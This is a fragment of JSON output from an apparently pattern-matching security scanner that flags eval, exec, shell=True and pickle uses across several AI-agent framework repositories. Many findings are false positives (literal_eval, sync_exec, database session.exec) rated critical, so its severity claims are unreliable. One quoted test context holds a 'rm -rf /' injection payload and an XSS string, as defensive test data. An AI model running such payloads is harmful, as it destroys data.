      "file": "AgentVerse\\agentverse\\environments\\tasksolving_env\\rules\\executor\\coverage_test.py",
      "line": 17,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    # TODO: make it more secure\n    result = subprocess.run(command, capture_output=True, shell=True, encoding=\"utf-8\")\n    result_list.append(f\"STDOUT:\\n{result.stdout}\\nSTDERR:\\n{result.stderr}\")"
    },
    {
      "file": "AgentVerse\\agentverse\\environments\\tasksolving_env\\rules\\executor\\tool_using.py",
      "line": 204,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                retrieved_tools = await response.json()\n                retrieved_tools = ast.literal_eval(retrieved_tools)\n        tools = deepcopy(curr_tools)"
    },
    {
      "file": "AgentVerse\\agentverse\\environments\\tasksolving_env\\rules\\executor\\tool_using.py",
      "line": 262,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    continue\n                arguments = ast.literal_eval(\n                    JsonRepair("
    },
    {
      "file": "AgentVerse\\agentverse\\llms\\openai.py",
      "line": 257,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                        function_name=response.choices[0].message.function_call.name,\n                        function_arguments=ast.literal_eval(\n                            response.choices[0].message.function_call.arguments"
    },
    {
      "file": "AgentVerse\\agentverse\\llms\\openai.py",
      "line": 365,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    try:\n                        arguments = ast.literal_eval(\n                            response.choices[0].message.function_call.arguments"
    },
    {
      "file": "AgentVerse\\agentverse\\llms\\openai.py",
      "line": 370,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                        try:\n                            arguments = ast.literal_eval(\n                                JsonRepair("
    },
    {
      "file": "autogen\\python\\packages\\agbench\\benchmarks\\HumanEval\\Scripts\\init_tasks.py",
      "line": 58,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\ndef download_human_eval():\n    \"\"\"Download the HumanEval dataset, un-gzips it, and returns a list of its parsed JSON objects.\"\"\""
    },
    {
      "file": "autogen\\python\\packages\\agbench\\benchmarks\\HumanEval\\Scripts\\init_tasks.py",
      "line": 107,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "def main():\n    human_eval = download_human_eval()\n    # Deprecated: reduced_human_eval = [t for t in human_eval if t[\"task_id\"] in REDUCED_SET]"
    },
    {
      "file": "autogen\\python\\packages\\autogen-agentchat\\src\\autogen_agentchat\\agents\\_code_executor_agent.py",
      "line": 291,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Deny file system operations in group chat\n                dangerous_operations = [\"open(\", \"file(\", \"os.\", \"subprocess\", \"eval(\", \"exec(\"]\n                if any(op in request.code for op in dangerous_operations):"
    },
    {
      "file": "autogen\\python\\packages\\autogen-agentchat\\src\\autogen_agentchat\\agents\\_code_executor_agent.py",
      "line": 291,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Deny file system operations in group chat\n                dangerous_operations = [\"open(\", \"file(\", \"os.\", \"subprocess\", \"eval(\", \"exec(\"]\n                if any(op in request.code for op in dangerous_operations):"
    },
    {
      "file": "autogen\\python\\packages\\autogen-core\\src\\autogen_core\\tools\\_function_tool.py",
      "line": 159,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                exec(import_code, exec_globals)\n            except ModuleNotFoundError as e:"
    },
    {
      "file": "autogen\\python\\packages\\autogen-core\\src\\autogen_core\\tools\\_function_tool.py",
      "line": 171,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        try:\n            exec(config.source_code, exec_globals)\n            func_name = config.source_code.split(\"def \")[1].split(\"(\")[0]"
    },
    {
      "file": "autogen\\python\\packages\\autogen-ext\\src\\autogen_ext\\code_executors\\local\\__init__.py",
      "line": 285,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            task = asyncio.create_task(\n                asyncio.create_subprocess_exec(\n                    py_executable,"
    },
    {
      "file": "autogen\\python\\packages\\autogen-ext\\src\\autogen_ext\\code_executors\\local\\__init__.py",
      "line": 418,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            task = asyncio.create_task(\n                asyncio.create_subprocess_exec(\n                    program,"
    },
    {
      "file": "autogen\\python\\packages\\autogen-ext\\src\\autogen_ext\\experimental\\task_centric_memory\\_memory_bank.py",
      "line": 2,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import os\nimport pickle\nfrom dataclasses import dataclass"
    },
    {
      "file": "autogen\\python\\packages\\autogen-ext\\src\\autogen_ext\\experimental\\task_centric_memory\\_string_similarity_map.py",
      "line": 2,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import os\nimport pickle\nfrom typing import Dict, List, Tuple, Union"
    },
    {
      "file": "autogen\\python\\packages\\autogen-ext\\tests\\test_openai_assistant_agent.py",
      "line": 224,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "@pytest.mark.asyncio\nasync def test_file_retrieval(\n    agent: OpenAIAssistantAgent, cancellation_token: CancellationToken, monkeypatch: pytest.MonkeyPatch, tmp_path: Path"
    },
    {
      "file": "autogen\\python\\packages\\autogen-studio\\autogenstudio\\database\\db_manager.py",
      "line": 127,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    if \"sqlite\" in str(self.engine.url):\n                        session.exec(text(\"PRAGMA foreign_keys=OFF\"))  # type: ignore\n"
    },
    {
      "file": "autogen\\python\\packages\\autogen-studio\\autogenstudio\\database\\db_manager.py",
      "line": 135,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    if \"sqlite\" in str(self.engine.url):\n                        session.exec(text(\"PRAGMA foreign_keys=ON\"))  # type: ignore\n"
    },
    {
      "file": "autogen\\python\\packages\\autogen-studio\\autogenstudio\\database\\db_manager.py",
      "line": 182,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                existing_model = session.exec(select(model_class).where(model_class.id == model.id)).first()\n                if existing_model:"
    },
    {
      "file": "autogen\\python\\packages\\autogen-studio\\autogenstudio\\database\\db_manager.py",
      "line": 234,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n                items = session.exec(statement).all()\n                result = [self._model_to_dict(item) if return_json else item for item in items]"
    },
    {
      "file": "autogen\\python\\packages\\autogen-studio\\autogenstudio\\database\\db_manager.py",
      "line": 253,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                if \"sqlite\" in str(self.engine.url):\n                    session.exec(text(\"PRAGMA foreign_keys=ON\"))  # type: ignore\n                statement = select(model_class)  # type: ignore"
    },
    {
      "file": "autogen\\python\\packages\\autogen-studio\\autogenstudio\\database\\db_manager.py",
      "line": 259,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n                rows = session.exec(statement).all()\n"
    },
    {
      "file": "autogen\\python\\packages\\autogen-studio\\tests\\test_db_manager.py",
      "line": 57,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        with Session(test_db.engine) as session:\n            result = session.exec(text(\"SELECT 1\")).first() # type: ignore\n            assert result[0] == 1"
    },
    {
      "file": "autogen\\python\\packages\\autogen-studio\\tests\\test_db_manager.py",
      "line": 59,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            assert result[0] == 1\n            result = session.exec(select(1)).first()\n            assert result == 1"
    },
    {
      "file": "autogen\\python\\samples\\gitty\\src\\gitty\\_github.py",
      "line": 42,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    cmd = [\"gh\", \"issue\", \"view\", str(issue_number), \"--repo\", f\"{owner}/{repo}\", \"--json\", \"body,author,comments\"]\n    proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)\n    stdout, stderr = await proc.communicate()"
    },
    {
      "file": "autogen\\python\\samples\\task_centric_memory\\eval_retrieval.py",
      "line": 28,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nasync def eval_retrieval(\n    memory_controller: MemoryController, client: ChatCompletionClient, logger: PageLogger, config: Dict[str, Any]"
    },
    {
      "file": "autogen\\python\\samples\\task_centric_memory\\eval_retrieval.py",
      "line": 105,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    # Call the example function.\n    results = await eval_retrieval(memory_controller, client, logger, config[\"test\"])\n"
    },
    {
      "file": "AWorld\\setup.py",
      "line": 62,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    if isinstance(cmd, str):\n        shell = True\n    else:"
    },
    {
      "file": "AWorld\\aworld\\runner.py",
      "line": 61,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def sync_run_task(task: Union[Task, List[Task]], run_conf: Config = None) -> Dict[str, TaskResponse]:\n        return sync_exec(Runners.run_task, task=task, run_conf=run_conf)\n"
    },
    {
      "file": "AWorld\\aworld\\runner.py",
      "line": 71,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    ) -> TaskResponse:\n        return sync_exec(\n            Runners.run,"
    },
    {
      "file": "AWorld\\aworld\\agents\\llm_agent.py",
      "line": 248,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \"\"\"Transform of descriptions of supported tools, agents, and MCP servers in the framework to support function calls of LLM.\"\"\"\n        sync_exec(self.async_desc_transform, )\n"
    },
    {
      "file": "AWorld\\aworld\\agents\\llm_agent.py",
      "line": 273,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                           **kwargs):\n        return sync_exec(self.async_messages_transform, image_urls=image_urls, observation=observation,\n                         message=message, **kwargs)"
    },
    {
      "file": "AWorld\\aworld\\agents\\llm_agent.py",
      "line": 495,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \"\"\"\n        return sync_exec(self.async_policy, observation, info, message, **kwargs)\n"
    },
    {
      "file": "AWorld\\aworld\\agents\\llm_agent.py",
      "line": 604,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                                                  context=message.context)\n        result = sync_exec(self.tools_aggregate_func, tool_results)\n        return result"
    },
    {
      "file": "AWorld\\aworld\\agents\\llm_agent.py",
      "line": 830,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Execute hook\n                msg = await hook.exec(message, context)\n                if msg:"
    },
    {
      "file": "AWorld\\aworld\\cmd\\utils\\trace_summarize.py",
      "line": 7,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import json\nimport pickle\nfrom asyncio.tasks import Task"
    },
    {
      "file": "AWorld\\aworld\\core\\runtime_engine.py",
      "line": 82,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            if inspect.iscoroutinefunction(func):\n                res = sync_exec(func, *args, **kwargs)\n            else:"
    },
    {
      "file": "AWorld\\aworld\\core\\runtime_engine.py",
      "line": 219,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            if asyncio.iscoroutinefunction(fn):\n                return sync_exec(fn, *args, **kwargs)\n            else:"
    },
    {
      "file": "AWorld\\aworld\\core\\agent\\base.py",
      "line": 186,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        observation = message.payload\n        sync_exec(\n            send_message,"
    },
    {
      "file": "AWorld\\aworld\\core\\tool\\base.py",
      "line": 229,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                )\n                sync_exec(send_message, tool_output_message)\n"
    },
    {
      "file": "AWorld\\aworld\\events\\util.py",
      "line": 29,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            topic = category\n        sync_exec(eventbus.subscribe, category, topic, func)\n        return func"
    },
    {
      "file": "AWorld\\aworld\\models\\ant_provider.py",
      "line": 329,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                x = response[\"data\"][\"values\"][\"data\"]\n                ast_str = ast.literal_eval(\"'\" + x + \"'\")\n                result = html.unescape(ast_str)"
    },
    {
      "file": "AWorld\\aworld\\models\\ant_provider.py",
      "line": 357,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                x = response[\"data\"][\"values\"][\"response\"]\n                ast_str = ast.literal_eval(\"'\" + x + \"'\")\n                result = html.unescape(ast_str)"
    },
    {
      "file": "AWorld\\aworld\\models\\ant_provider.py",
      "line": 385,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                x = response[\"data\"][\"values\"][\"data\"]\n                ast_str = ast.literal_eval(\"'\" + x + \"'\")\n                result = html.unescape(ast_str)"
    },
    {
      "file": "AWorld\\aworld\\models\\ant_provider.py",
      "line": 416,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                x = response[\"data\"][\"values\"][\"response\"]\n                ast_str = ast.literal_eval(\"'\" + x + \"'\")\n                result = html.unescape(ast_str)"
    },
    {
      "file": "AWorld\\aworld\\replay_buffer\\storage\\multi_proc_mem.py",
      "line": 3,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import traceback\nimport pickle\nfrom typing import Dict, List"
    },
    {
      "file": "AWorld\\aworld\\runners\\handler\\base.py",
      "line": 80,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                msg = await hook.exec(message)\n                if msg:"
    },
    {
      "file": "AWorld\\aworld\\runners\\hook\\agent_hooks.py",
      "line": 21,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    async def exec(self, message: Message, context: Context = None) -> Message:\n        # and do something"
    },
    {
      "file": "AWorld\\aworld\\runners\\hook\\agent_hooks.py",
      "line": 34,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    async def exec(self, message: Message, context: Context = None) -> Message:\n        # get context"
    },
    {
      "file": "AWorld\\aworld\\runners\\hook\\hooks.py",
      "line": 27,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    @abc.abstractmethod\n    async def exec(self, message: Message, context: Context = None) -> Message:\n        \"\"\"Execute hook function.\"\"\""
    },
    {
      "file": "AWorld\\aworld\\runners\\hook\\output_process_hooks.py",
      "line": 25,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    async def exec(self, message: Message, context: Context = None) -> Message:\n        \"\"\"Process ModelResponse type messages"
    },
    {
      "file": "AWorld\\aworld\\runners\\hook\\template.py",
      "line": 23,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    async def exec(self, message: Message) -> Message:\n        {func_import}import {func}"
    },
    {
      "file": "AWorld\\aworld\\session\\simple_session_service.py",
      "line": 2,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import os\nimport pickle\nimport threading"
    },
    {
      "file": "AWorld\\aworld\\tools\\mcp_tool\\executor.py",
      "line": 280,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        List[ActionResult], Any]:\n        return sync_exec(self.async_execute_action, actions, **kwargs)\n"
    },
    {
      "file": "AWorld\\aworld\\trace\\msg_format.py",
      "line": 191,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # The actual value of the expression.\n                value = eval(value_code, global_vars, local_vars)\n                extra_attrs[source] = value"
    },
    {
      "file": "AWorld\\aworld\\trace\\msg_format.py",
      "line": 195,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Format the value according to the format spec, converting to a string.\n                formatted = eval(formatted_code, global_vars, {**local_vars, '@fvalue': value})\n                formatted = self._clean_value(formatted)"
    },
    {
      "file": "AWorld\\aworld\\trace\\msg_format.py",
      "line": 334,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # with a normal variable.\n                # The value of this variable will be provided in the eval() call\n                # and will come from evaluating value_code above."
    },
    {
      "file": "AWorld\\aworld\\trace\\msg_format.py",
      "line": 99,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    'This happens when running in an interactive shell, '\n                    'using exec(), or running .pyc files without the source .py files.',\n                    get_stacklevel(frame),"
    },
    {
      "file": "AWorld\\aworld\\trace\\rewrite_ast.py",
      "line": 43,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        globs[context_factories_var_name] = context_factories\n        exec(code, globs, globs)\n"
    },
    {
      "file": "AWorld\\aworld\\utils\\common.py",
      "line": 188,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\ndef sync_exec(async_func: Callable[..., Any], *args, **kwargs):\n    \"\"\"Async function to sync execution.\"\"\""
    },
    {
      "file": "AWorld\\aworlddistributed\\aworldspace\\agents\\playwright_agent.py",
      "line": 292,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\ndef WebJudge_Online_Mind2Web_eval(task, last_actions, images_path, image_responses, key_points, score_threshold):\n    system_msg = \"\"\"You are an expert in evaluating the performance of a web navigation agent. The agent is designed to help a human user navigate a website to complete a task. Given the user's task, the agent's action history, key points for task completion, some potentially important web pages in the agent's trajectory and their reasons, your goal is to determine whether the agent has completed the task and achieved all requirements."
    },
    {
      "file": "AWorld\\aworlddistributed\\aworldspace\\agents\\playwright_agent.py",
      "line": 595,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n            eval_messages, text, system_msg, record = WebJudge_Online_Mind2Web_eval(\n                self.task, self.step_actions, self.step_images, image_responses, key_points, 3)"
    },
    {
      "file": "AWorld\\examples\\common\\tools\\android\\action\\executor.py",
      "line": 28,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        for action in actions:\n            action_result = self._exec(action, **kwargs)\n            action_results.append(action_result)"
    },
    {
      "file": "AWorld\\examples\\common\\tools\\android\\action\\executor.py",
      "line": 32,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    def _exec(self, action_model: ActionModel, **kwargs):\n        action_name = action_model.action_name"
    },
    {
      "file": "AWorld\\examples\\common\\tools\\browsers\\async_browser.py",
      "line": 146,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import asyncio\n            return asyncio.create_subprocess_exec(*cmd_list)\n"
    },
    {
      "file": "AWorld\\examples\\common\\tools\\browsers\\browser.py",
      "line": 149,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import asyncio\n            return asyncio.create_subprocess_exec(*cmd_list)\n"
    },
    {
      "file": "AWorld\\examples\\common\\tools\\browsers\\action\\executor.py",
      "line": 29,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        for action in actions:\n            action_result, page = self._exec(action, **kwargs)\n            action_results.append(action_result)"
    },
    {
      "file": "AWorld\\examples\\common\\tools\\browsers\\action\\executor.py",
      "line": 46,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        for action in actions:\n            action_result, page = await self._async_exec(action, **kwargs)\n            action_results.append(action_result)"
    },
    {
      "file": "AWorld\\examples\\common\\tools\\browsers\\action\\executor.py",
      "line": 50,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    def _exec(self, action_model: ActionModel, **kwargs):\n        action_name = action_model.action_name"
    },
    {
      "file": "AWorld\\examples\\common\\tools\\browsers\\action\\executor.py",
      "line": 60,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    async def _async_exec(self, action_model: ActionModel, **kwargs):\n        action_name = action_model.action_name"
    },
    {
      "file": "AWorld\\examples\\gaia\\mcp_collections\\documents\\msxlsx.py",
      "line": 75,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import asyncio\n            return asyncio.create_subprocess_exec(*cmd_list)\n"
    },
    {
      "file": "AWorld\\examples\\gaia\\mcp_collections\\tools\\pubchem.py",
      "line": 9,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "- Compound search by name, CID, SMILES, or InChI\n- Property retrieval (molecular weight, formula, etc.)\n- Structure similarity searches"
    },
    {
      "file": "AWorld\\examples\\gaia\\mcp_collections\\tools\\terminal.py",
      "line": 48,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import asyncio\n            return asyncio.create_subprocess_exec(*cmd_list)\n"
    },
    {
      "file": "AWorld\\examples\\gaia\\mcp_collections\\tools\\terminal.py",
      "line": 212,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                    stderr=asyncio.subprocess.PIPE,\n                    shell=True,\n                    executable=\"/bin/bash\","
    },
    {
      "file": "AWorld\\examples\\multi_agents\\coordination\\custom_agent\\agent.py",
      "line": 122,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            logger.info(f\"Execute response: {llm_result.message}\")\n            res = sync_exec(self.model_output_parser.parse, llm_result, agent_id=self.id())\n            content = res.actions[0].policy_info"
    },
    {
      "file": "AWorld\\examples\\multi_agents\\coordination\\custom_agent\\agent.py",
      "line": 232,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                logger.warning(\"no result to record!\")\n        res = sync_exec(self.model_output_parser.parse, llm_result, agent_id=self.id())\n        content = res.actions[0].policy_info"
    },
    {
      "file": "AWorld\\tests\\runners\\hook\\llm_hook.py",
      "line": 15,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    async def exec(self, message: Message, context: Context = None) -> Message:\n        agent = AgentFactory.agent_instance(message.sender)"
    },
    {
      "file": "AWorld\\tests\\runners\\hook\\llm_hook.py",
      "line": 27,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    async def exec(self, message: Message, context: Context = None) -> Message:\n        agent = AgentFactory.agent_instance(message.sender)"
    },
    {
      "file": "AWorld\\tests\\trace\\trace_agent.py",
      "line": 84,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        agent_result = sync_exec(self.model_output_parser.parse, llm_response, agent_id=self.id())\n        if not agent_result.is_call_tool:"
    },
    {
      "file": "crewAI\\src\\crewai\\tools\\tool_usage.py",
      "line": 527,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        try:\n            arguments = ast.literal_eval(tool_input)\n            if isinstance(arguments, dict):"
    },
    {
      "file": "crewAI\\src\\crewai\\utilities\\file_handler.py",
      "line": 3,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import os\nimport pickle\nfrom datetime import datetime"
    },
    {
      "file": "crewAI\\src\\crewai\\utilities\\training_handler.py",
      "line": 3,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "\nfrom crewai.utilities.file_handler import PickleHandler\n"
    },
    {
      "file": "crewAI\\tests\\task_test.py",
      "line": 1297,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    parsed_result = eval(result)\n    assert isinstance(parsed_result, list)"
    },
    {
      "file": "crewAI\\tests\\task_test.py",
      "line": 1323,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    result = interpolate_only(\"{company}\", input_data)\n    parsed = eval(result)\n"
    },
    {
      "file": "crewAI\\tests\\task_test.py",
      "line": 1341,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    result = interpolate_only(\"{special_data}\", input_data)\n    parsed = eval(result)\n"
    },
    {
      "file": "crewAI\\tests\\task_test.py",
      "line": 1363,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    result = interpolate_only(\"{data}\", input_data)\n    parsed = eval(result)\n"
    },
    {
      "file": "crewAI\\tests\\task_test.py",
      "line": 1386,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    result = interpolate_only(\"{report}\", input_data)\n    parsed = eval(result)\n"
    },
    {
      "file": "crewAI\\tests\\task_test.py",
      "line": 1459,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    result = interpolate_only(\"{data}\", {\"data\": valid_data})\n    parsed = eval(result)\n    assert parsed[\"name\"] == \"Valid Dataset\""
    },
    {
      "file": "crewAI\\tests\\task_test.py",
      "line": 1489,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    result = interpolate_only(\"{data}\", {\"data\": valid_data})\n    parsed = eval(result)\n"
    },
    {
      "file": "crewAI\\tests\\test_lite_agent.py",
      "line": 56,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        try:\n            result = eval(expression, {\"__builtins__\": {}})\n            return f\"The result of {expression} is {result}\""
    },
    {
      "file": "crewAI\\tests\\utilities\\test_file_handler.py",
      "line": 6,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "\nfrom crewai.utilities.file_handler import PickleHandler\n"
    },
    {
      "file": "GENERATED_TESTS\\test_intelligence_hub_comprehensive.py",
      "line": 206,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"__import__('os').system('rm -rf /')\",\n            \"eval('malicious_code')\",\n            \"<script>alert('XSS')</script>\","
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 30,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        @staticmethod\n        def safe_eval(expr, allowed=None):\n            return {}"
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 51,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def test_eval_injection_prevention(self):\n        \"\"\"Test that eval() usage is replaced with safe alternatives\"\"\"\n        # Arrange"
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 56,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
